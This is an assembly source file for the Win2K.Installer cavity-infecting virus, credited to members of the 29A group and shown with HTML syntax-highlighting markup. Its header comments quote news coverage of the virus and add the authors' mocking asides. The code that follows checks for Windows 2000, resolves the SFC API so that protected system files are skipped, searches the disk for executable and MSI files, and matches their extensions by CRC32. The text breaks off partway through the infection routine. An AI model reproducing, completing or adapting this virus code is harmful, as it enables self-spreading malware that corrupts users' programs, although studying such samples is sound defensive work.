</span><span class="sc1">;"The interesting thing is that it already exists, not that it is a big threat,"</span><span class="sc0">
</span><span class="sc1">;Hyppönen said. "It will probably not have much of a life span in the real</span><span class="sc0">
</span><span class="sc1">;world since ours, as well as other anti-virus software programs, already can</span><span class="sc0">
</span><span class="sc1">;handle it." From now on, however, most new viruses are likely to include</span><span class="sc0">
</span><span class="sc1">;compatibility with Windows 2000, Hyppönen added. "Windows 2000 will be a</span><span class="sc0">
</span><span class="sc1">;widely-used operating system, and virus writers target the widest possible</span><span class="sc0">
</span><span class="sc1">;reach," he said. F-Secure received a sample of the virus via an anonymous</span><span class="sc0">
</span><span class="sc1">;e-mail, as did several other leading anti-virus software vendors, Hyppönen said.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus was probably written by an international group of virus writers</span><span class="sc0">
</span><span class="sc1">;known as the 29A virus group, he said. "It is the first Windows 2000 virus, so</span><span class="sc0">
</span><span class="sc1">;I think they are mainly after the media attention -- they want their five</span><span class="sc0">
</span><span class="sc1">;minutes of fame." [* hahaha, and u'll get your money, so don't complain! *]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Win2K.Inta works by infecting program files and spreads from one computer to</span><span class="sc0">
</span><span class="sc1">;another when these files are exchanged. Once infected, the files do not grow</span><span class="sc0">
</span><span class="sc1">;in size, according to F-Secure, and the virus is capable of infecting files</span><span class="sc0">
</span><span class="sc1">;with the following extensions: EXE, COM, DLL, ACM, AX, CNV, CPL, DRV, MPD, OCX,</span><span class="sc0">
</span><span class="sc1">;PCI, SCR, SYS, TSP, TLB, VWP, WPC, and MSI. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This list includes several classes of programs that to date have not been</span><span class="sc0">
</span><span class="sc1">;susceptible to virus infection, F-Secure said. For example, this virus will</span><span class="sc0">
</span><span class="sc1">;analyze Microsoft Windows Installer files (MSI), scan them for embedded</span><span class="sc0">
</span><span class="sc1">;programs, and infect them, the company said in a statement. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus contains this text string, which is never displayed:</span><span class="sc0">
</span><span class="sc1">;(Win2000.Installer) by Benny/29A &amp; Darkman/29A, according to F-Secure.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Further information about the virus can be found at:</span><span class="sc0">
</span><span class="sc1">;www.F-Secure.com/virus-info/v-pics.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;News from IDG</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Virus isn't a threat, but it may be the first of many to greet the new</span><span class="sc0">
</span><span class="sc1">;operating system. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;by Terho Uimonen, IDG News Service </span><span class="sc0">
</span><span class="sc1">;January 13, 2000, 9:58 a.m. PT </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Everyone, it seems, is eagerly anticipating Windows 2000--including virus</span><span class="sc0">
</span><span class="sc1">;writers. Antivirus software vendor F-Secure says it has received a sample of</span><span class="sc0">
</span><span class="sc1">;the first virus written specifically to operate under Microsoft's forthcoming</span><span class="sc0">
</span><span class="sc1">;operating system. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Known as Win2K.Inta or Win2000.Install, the virus operates only under Windows</span><span class="sc0">
</span><span class="sc1">;2000 and is not designed to function at all under older versions of Windows. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;F-Secure does not consider the virus to be a big threat however, since it has</span><span class="sc0">
</span><span class="sc1">;received no reports that the virus is "in the wild," says Mikko Hyppönen,</span><span class="sc0">
</span><span class="sc1">;manager of antivirus research at the Finland-based company. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;"It will probably not have much of a life span in the real world since ours,</span><span class="sc0">
</span><span class="sc1">;as well as other antivirus software programs, already can handle it," says</span><span class="sc0">
</span><span class="sc1">;Hyppönen. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;From now on, however, most new viruses are likely to include compatibility</span><span class="sc0">
</span><span class="sc1">;with Windows 2000, Hyppönen added. "Windows 2000 will be a widely-used</span><span class="sc0">
</span><span class="sc1">;operating system, and virus writers target the widest possible reach." </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus was probably written by a known, international group of virus</span><span class="sc0">
</span><span class="sc1">;writers known as the 29A virus group, he says. "It is the first Windows 2000</span><span class="sc0">
</span><span class="sc1">;virus, so I think they are mainly after the media attention--they want their</span><span class="sc0">
</span><span class="sc1">;five minutes of fame." </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Win2K.Inta works by infecting program files, and spreads from one computer</span><span class="sc0">
</span><span class="sc1">;to another when these files are exchanged. Once infected, the files do not</span><span class="sc0">
</span><span class="sc1">;grow in size, according to F-Secure. The virus is capable of infecting files</span><span class="sc0">
</span><span class="sc1">;with the following extensions:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    .exe, .com, .dll, .acm, .ax, .cnv, .cpl, .drv, .mpd, .ocx, .pci,</span><span class="sc0">
</span><span class="sc1">;    .scr, .sys, .tsp, .tlb, .vwp, .wpc, and .msi</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The list includes several classes of programs that to date have not been</span><span class="sc0">
</span><span class="sc1">;susceptible to virus infection, F-Secure says. For example, this virus will</span><span class="sc0">
</span><span class="sc1">;analyze Microsoft Windows Installer files, scan them for embedded programs,</span><span class="sc0">
</span><span class="sc1">;and infect them, the company says in a statement. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;News from CNN</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Windows 2000 virus: Stunt or preview?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;January 17, 2000</span><span class="sc0">
</span><span class="sc1">;Web posted at: 9:57 a.m. EST (1457 GMT)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;by Stan Miastkowski</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;(IDG) -- The discovery this week of the first computer virus that works</span><span class="sc0">
</span><span class="sc1">;specifically with Windows 2000 initially brought questions about the</span><span class="sc0">
</span><span class="sc1">;soon-to-be-unveiled operating system's security.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;But experts who have taken a closer look at the virus, officially dubbed</span><span class="sc0">
</span><span class="sc1">;W2K.Installer.1676, say it doesn't take advantage of any potential security</span><span class="sc0">
</span><span class="sc1">;holes. In fact, it's a relatively conventional file virus that only infects</span><span class="sc0">
</span><span class="sc1">;Windows 2000 for the simple reason that it checks to see which OS it's running</span><span class="sc0">
</span><span class="sc1">;on, and spreads only if it's Windows 2000.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus isn't in actual circulation yet, nor do virus researchers expect it</span><span class="sc0">
</span><span class="sc1">;to ever be. Research labs found out about W2K.Installer.1676 when it was sent</span><span class="sc0">
</span><span class="sc1">;to them, apparently by its author. In addition, it lacks a damage-causing</span><span class="sc0">
</span><span class="sc1">;payload. The only thing it does is spread itself.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Despite the virus being characterized as "rare," major antivirus software</span><span class="sc0">
</span><span class="sc1">;makers say their existing packages will detect W2K.Installer.1676 because of</span><span class="sc0">
</span><span class="sc1">;the way it works, although they plan to add specific protection against it in</span><span class="sc0">
</span><span class="sc1">;their next virus signature updates.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Vincent Weafer, director of the Symantec Antivirus Research Center, says that</span><span class="sc0">
</span><span class="sc1">;W2K.Installer.1676 may simply be a "proof of concepts," a typical</span><span class="sc0">
</span><span class="sc1">;first-generation virus where the dark fraternity of (mainly male) virus</span><span class="sc0">
</span><span class="sc1">;writers explore a new OS, looking for holes or just proving that they can</span><span class="sc0">
</span><span class="sc1">;write a virus that works only with that OS, which they were able to do in</span><span class="sc0">
</span><span class="sc1">;this case.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Or it may just be an ego thing, according to Weafer, with the author wanting</span><span class="sc0">
</span><span class="sc1">;to be the first to write a Windows 2000 virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;No antivirus magic in W2K</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;While Weafer says that Windows 2000 is "overall a more secure operating</span><span class="sc0">
</span><span class="sc1">;system," he says that users still need to be careful, because most viruses</span><span class="sc0">
</span><span class="sc1">;that can infect Windows 98 and NT can also infect the new OS.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Under the hood, W2K.Installer.1676 is what's known as a "cavity infector," a</span><span class="sc0">
</span><span class="sc1">;common type of virus that looks through files to find unused spaces in the</span><span class="sc0">
</span><span class="sc1">;code. When it finds a space big enough, it inserts itself in the file. And</span><span class="sc0">
</span><span class="sc1">;because it doesn't actually change the size of the file, it attempts to work</span><span class="sc0">
</span><span class="sc1">;around the "heuristic" protection in most antivirus software, which looks for</span><span class="sc0">
</span><span class="sc1">;unexpected changes in the sizes of files.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;In one way, W2K.Installer.1676 is almost a step back to reusing earlier virus</span><span class="sc0">
</span><span class="sc1">;technology in a new context. Cavity infectors were widely used in early DOS</span><span class="sc0">
</span><span class="sc1">;viruses, but fell out of favor with virus writers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;When asked about Microsoft's reaction to W2K.Installer.1676, a spokesperson</span><span class="sc0">
</span><span class="sc1">;said it's nothing but "a publicity stunt." She added that "a virus is by</span><span class="sc0">
</span><span class="sc1">;definition just an application that does something malevolent, and Windows</span><span class="sc0">
</span><span class="sc1">;2000 runs applications." [* hahaha, so where's that security u talked about?! *]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Last comments</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;There were written tons of papers about our virus in both of printing and</span><span class="sc0">
</span><span class="sc1">;internet magazines, but we wanted to show ya only tho most important ones.</span><span class="sc0">
</span><span class="sc1">;Another reason why we didn't publish everything is becoz many articles were</span><span class="sc0">
</span><span class="sc1">;written in another languages than english, and we don't expect u can speak</span><span class="sc0">
</span><span class="sc1">;czech, slovak or for instance swedish :)</span><span class="sc0">
</span><span class="sc1">;Now u probably expect the final smart sentence :). Ok, here is it: We didn't</span><span class="sc0">
</span><span class="sc1">;code this virus to show that we r first (as AVerz say), but to show that</span><span class="sc0">
</span><span class="sc1">;Micro$oft LIED! Win2000 is the same crap as DOS.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;(c) 1999 coded by Benny/29A and Darkman/29A in Denmark in our VX mini-meeting.</span><span class="sc0">



</span><span class="sc2">.386p</span><span class="sc0">                       </span><span class="sc1">;386 instructions</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">                 </span><span class="sc1">;flat model</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">mz.inc</span><span class="sc0">                  </span><span class="sc1">;include some useful</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pe.inc</span><span class="sc0">                  </span><span class="sc1">;filez</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">


</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">              </span><span class="sc1">;API for first gen. only</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;some data for .data section</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">                       </span><span class="sc1">;code section</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_host</span><span class="sc4">&gt;</span><span class="sc0">      </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_base</span><span class="sc0">               </span><span class="sc1">;get base of Kernel32.dll</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;quit if not found</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_host</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc0">             </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">gdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;delta offset to EBP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_apis</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_GetVersion</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Get OS version</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">;must be 5 - Win2000</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_host</span><span class="sc0">                </span><span class="sc1">;quit if not Win2000</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@sfclib</span><span class="sc0">                </span><span class="sc1">;push string to stack</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SFC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;name of SFC library</span><span class="sc0">
</span><span class="sc5">@sfclib</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_LoadLibraryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;load library</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">               </span><span class="sc1">;result to EBX</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_host</span><span class="sc0">             </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lib_ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">   </span><span class="sc1">;save the address for FreeLib API</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@sfcapi</span><span class="sc0">                </span><span class="sc1">;push string to stack</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SfcIsFileProtected'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;name of SFC API</span><span class="sc0">
</span><span class="sc5">@sfcapi</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;address of lib. in memory</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_GetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get API address</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_lib</span><span class="sc0">              </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">api_ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;save it for l8r call</span><span class="sc0">


    </span><span class="sc1">;now we will search the entire actual disk for the files and try to</span><span class="sc0">
    </span><span class="sc1">;infect them</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cBuffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Address of buffer for current</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">                </span><span class="sc1">; Size, in characters, of directory</span><span class="sc0">
                                        </span><span class="sc1">; buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_GetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EBX = pointer to WFD</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">s_tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Find infectable files</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szCurDir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EAX = pointer to szCurDir</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_SetCurrentDirectory_</span><span class="sc0">
</span><span class="sc5">_FindFirstFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; Address of returned information</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szFileName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Address of name of file to search</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; for</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">a_FindFirstFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; EDX = search handle</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Function failed?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">_SetCurrentDirectory</span><span class="sc0">    </span><span class="sc1">; Zero? Jump to _SetCurrentDirectory</span><span class="sc0">
</span><span class="sc5">examine_filename</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EAX = pointer to WFD_szFileName</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">  </span><span class="sc1">; Dot?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_FindNextFile</span><span class="sc0">       </span><span class="sc1">; Equal? Jump to _FindNextFile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'..'</span><span class="sc0"> </span><span class="sc1">; Dot dot?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">examine_command_register</span><span class="sc0">
                    </span><span class="sc1">; Not equal? Jump to</span><span class="sc0">
                    </span><span class="sc1">; examine_command_register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc1">; NULL?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_FindNextFile</span><span class="sc0">       </span><span class="sc1">; Equal? Jump to _FindNextFile</span><span class="sc0">
</span><span class="sc5">examine_command_register</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">      </span><span class="sc1">; temporary variable</span><span class="sc0">
</span><span class="sc5">s_tmp</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">; Find infectable files or previous</span><span class="sc0">
                    </span><span class="sc1">; directory?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">examine_attribute</span><span class="sc0">   </span><span class="sc1">; Zero? Jump to examine_attribute</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; EDI = pointer to cFileName</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; ECX = size of file extension</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">           </span><span class="sc1">; Found current directory?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_FindNextFile</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to _FindNextFile</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">s_tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Find infectable files</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_FindNextFile</span><span class="sc0">
</span><span class="sc5">examine_attribute</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_dwFileAttributes</span><span class="sc4">],</span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
                    </span><span class="sc1">; Directory?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">_FindClose</span><span class="sc0">      </span><span class="sc1">; Not zero? Jump to _FindClose</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; EDI = pointer to cFileName</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">          </span><span class="sc1">; AL = dot</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_last_char</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; EDI = size of file extension</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">9EEC823Dh</span><span class="sc0">       </span><span class="sc1">; .MSI file extension?</span><span class="sc0">
